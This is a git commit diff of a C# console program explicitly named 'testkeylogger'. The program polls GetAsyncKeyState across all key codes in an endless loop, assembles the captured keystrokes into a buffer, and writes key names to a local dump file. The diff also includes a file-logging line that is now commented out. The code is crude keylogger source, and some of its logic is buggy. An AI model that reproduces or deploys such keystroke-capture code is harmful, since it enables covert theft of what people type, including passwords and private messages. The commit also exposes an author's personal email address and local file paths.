11f33f8b1bf3c695bcb3b16b6b4d26aec5f68e36
xeteru <alyjeancharles21@gmail.com>
2023-05-26 18:38:13 -0400

    ehh

--- Program.cs
+++ Program.cs
@@ -11,17 +11,37 @@ namespace testkeylogger
 {
     class Program
     {
-        FileStream open = File.Create(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\testkeylogger\keylogger.txt");
+        public static string GetVirtualKeyString(int keyCode)
+        {
+            char[] keyName = new char[256];
+            int result = GetKeyNameText(keyCode << 16, keyName, keyName.Length);
+            if (result > 0)
+            {
+                return new string(keyName, 0, result);
+            }
+            return string.Empty;
+        }
+
         private static string buffer = "";
         [STAThread]
         static void Main(string[] args)
         {
+            StreamWriter sw = new StreamWriter(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\dump.txt");
+            if (File.Exists(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\keylogger.txt") || File.Exists(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\dump.txt"))
+            {
+                File.Delete(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\keylogger.txt");
+
+            }
+            File.Create(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\keylogger.txt");
+           
             while (true)
             {
                 Thread.Sleep(100);
                 for (int i = 0; i < 255; i++)
                 {
-                    if (GetAsyncKeyState(i) != 0)
+                    int key = GetAsyncKeyState(i);
+                    sw.WriteLine(GetVirtualKeyString(key));
+                    if (key == 1 || key == 32769)
                     {
                         buffer += ((Keys)i).ToString();
                         if (((Keys)i) == Keys.Space)
@@ -40,15 +60,15 @@ namespace testkeylogger
                         }
                         if (((Keys)i).ToString().Length == 1)
                         {
-                            buffer += ((Keys)i).ToString();
-                            Console.Write("HERE");
+                            buffer += ((Keys)i);
+                            Console.Write(buffer);
                         }
                         if (buffer.Length > 10)
                         {
-                            File.AppendAllText(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\testkeylogger\keylogger.txt", buffer);
+                            //File.AppendAllText(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\keylogger.txt", buffer);
                             buffer = "";
                         }
-                        
+
                     }
                 }
 
@@ -57,6 +77,8 @@ namespace testkeylogger
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
+        [DllImport("user32.dll")]
+        public static extern int GetKeyNameText(int lParam, [Out] char[] lpString, int nSize);
     }
 
 
